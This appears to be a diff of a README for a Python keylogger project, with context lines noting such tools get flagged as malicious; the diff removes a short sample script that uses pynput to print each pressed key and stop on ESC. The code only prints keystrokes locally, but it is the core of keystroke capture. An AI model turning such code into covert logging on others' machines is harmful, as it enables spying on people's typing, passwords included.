@@ -13,15 +13,6 @@ Since keyloggers are often flagged as malicious tools, this script may trigger a
 - Supports stopping the keylogger with `ESC` key
 - Lightweight and simple Python script
 
-##Sample Code (keylogger.py)
-from pynput.keyboard import Key, Listener
-def on_press(key):
-    print(f"{key} pressed")
-def on_release(key):
-    if key == Key.esc:
-        return False  # Stop listener
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
 
 ## 🛠️ Setup Instructions
 
